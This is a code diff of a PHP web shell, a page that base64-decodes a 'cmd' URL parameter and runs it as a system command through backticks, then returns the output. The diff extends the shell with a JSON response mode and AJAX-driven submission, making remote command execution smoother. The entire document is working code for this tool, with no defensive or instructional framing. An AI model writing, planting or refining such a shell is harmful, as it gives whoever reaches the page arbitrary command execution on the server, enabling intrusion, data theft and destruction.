@@ -7,6 +7,10 @@ $raw = ifset($_GET['cmd']);
 $cmd = escapeshellcmd(base64_decode($raw));
 $input = htmlentities($cmd);
 $output = htmlentities(`$cmd`);
+if (ifset($_GET['format']) === 'json') {
+  header('Content-type: application/json');
+  die(json_encode(array('output' => base64_encode($output), 'input' => base64_encode($input))));
+}
 ?><!DOCTYPE html>
 <html lang="en">
 <head>
@@ -32,7 +36,15 @@ fieldset, input {
 $(function() {
   $('#f').submit(function () {
     $('#cmd').val($.base64Encode($('#cmd').val()));
-    return true;
+    $.get($(this).attr('action'), {
+      'cmd': $('#cmd').val(),
+      'format': 'json'
+    }, function (data) {
+      $('#output').text($.base64Decode(data.output));
+      $('#input').text('$ ' + $.base64Decode(data.input));
+      $('#cmd').val($.base64Decode(data.input)).select();
+    });
+    return false;
   });
   $('#cmd').select();
 });
